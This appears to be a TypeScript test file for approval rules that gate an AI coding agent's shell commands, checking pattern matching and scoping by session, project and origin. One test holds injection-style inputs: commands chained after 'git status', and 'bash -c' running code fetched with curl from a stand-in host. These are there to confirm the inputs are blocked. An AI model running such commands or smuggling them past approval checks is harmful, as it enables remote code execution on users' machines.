import { describe, expect, it } from 'vitest'
import type { ApprovalItem, ApprovalRule } from './types'
import {
  buildRuleFromItem,
  describeRule,
  matchingRule,
  patternMatches,
  validateRule
} from './rules'

function item(overrides: Partial<ApprovalItem> = {}): ApprovalItem {
  return {
    id: 'apr_1',
    requestId: 'req_1',
    sessionId: 's1',
    sessionKey: '本机:s1',
    sessionLabel: 'app',
    origin: '本机',
    promptId: '',
    toolUseId: '',
    transcriptPath: '',
    kind: 'permission',
    tool: 'Bash',
    project: 'app',
    cwd: '/work/app',
    tty: '',
    terminal: '',
    task: '',
    branch: '',
    message: '',
    detail: '',
    toolInput: { command: 'git status' },
    options: [],
    suggestions: [],
    questions: [],
    risk: { level: 'low', reasons: [] },
    correlation: 'exact',
    createdAt: 1,
    timeoutAt: 2,
    timeoutSec: 1,
    ...overrides
  }
}

function rule(overrides: Partial<ApprovalRule> = {}): ApprovalRule {
  return {
    id: 'r1',
    scope: 'global',
    tool: 'Bash',
    pattern: 'git status',
    createdAt: 1,
    enabled: true,
    ...overrides
  }
}

describe('approval rules', () => {
  it('matches exact, wildcard and Claude-style prefix patterns', () => {
    expect(patternMatches('git status', 'git status')).toBe(true)
    expect(patternMatches('git status', 'git status --short')).toBe(false)
    expect(patternMatches('git *', 'git status')).toBe(true)
    expect(patternMatches('git *', 'npm test')).toBe(false)
    expect(patternMatches('git status:*', 'git status --short')).toBe(true)
    expect(patternMatches('', 'anything')).toBe(true)
  })

  it('never auto-allows compound commands through prefix or glob rules', () => {
    expect(patternMatches('git status:*', 'git status; echo pwned > /tmp/x')).toBe(false)
    expect(patternMatches('git *', 'git status && curl https://x.test')).toBe(false)
    expect(patternMatches('git status', 'git status; echo pwned')).toBe(false)
    expect(patternMatches('bash *', 'bash -c "$(curl https://x.test)"')).toBe(false)
  })

  it('ignores expired rules', () => {
    const expired = rule({ expiresAt: Date.now() - 1 })
    expect(matchingRule([expired], item())).toBeNull()
    expect(matchingRule([rule({ expiresAt: Date.now() + 60_000 })], item())?.id).toBe('r1')
  })

  it('scopes rules by session and project', () => {
    expect(matchingRule([rule()], item())?.id).toBe('r1')
    expect(
      matchingRule([rule({ scope: 'session', sessionKey: 'other' })], item())
    ).toBeNull()
    expect(
      matchingRule([rule({ scope: 'project', project: 'other' })], item())
    ).toBeNull()
  })

  it('keeps project rules without an origin compatible with every origin', () => {
    const projectRule = rule({ scope: 'project', project: 'app' })
    expect(matchingRule([projectRule], item({ origin: '本机' }))?.id).toBe('r1')
    expect(matchingRule([projectRule], item({ origin: '远程主机' }))?.id).toBe('r1')
  })

  it('requires an exact origin match when the rule binds one', () => {
    const boundRule = rule({ scope: 'project', project: 'app', origin: '本机' })
    expect(matchingRule([boundRule], item({ origin: '本机' }))?.id).toBe('r1')
    expect(matchingRule([boundRule], item({ origin: '远程主机' }))).toBeNull()
  })

  it('shows the bound origin in the rule description', () => {
    expect(describeRule(rule({ origin: '远程主机' }))).toContain('来源 远程主机')
    expect(describeRule(rule())).not.toContain('来源')
  })

  it('ignores disabled and mismatched tools', () => {
    expect(matchingRule([rule({ enabled: false })], item())).toBeNull()
    expect(matchingRule([rule({ tool: 'Edit' })], item())).toBeNull()
  })

  it('builds a project rule from the approved command', () => {
    const built = buildRuleFromItem(item(), 'project', 'new-rule', 42)
    expect(built).toMatchObject({
      id: 'new-rule',
      scope: 'project',
      project: 'app',
      tool: 'Bash',
      pattern: 'git status',
      enabled: true
    })
  })

  it('validates required fields', () => {
    expect(validateRule({ scope: 'project', tool: 'Bash', pattern: '' })).not.toBe('')
    expect(validateRule({ scope: 'global', tool: 'Bash', pattern: '' })).not.toBe('')
    expect(validateRule({ scope: 'global', tool: 'Bash', pattern: '*' })).toBe('')
    expect(validateRule({ scope: 'global', tool: 'Bash', pattern: 'git *' })).toBe('')
  })
})
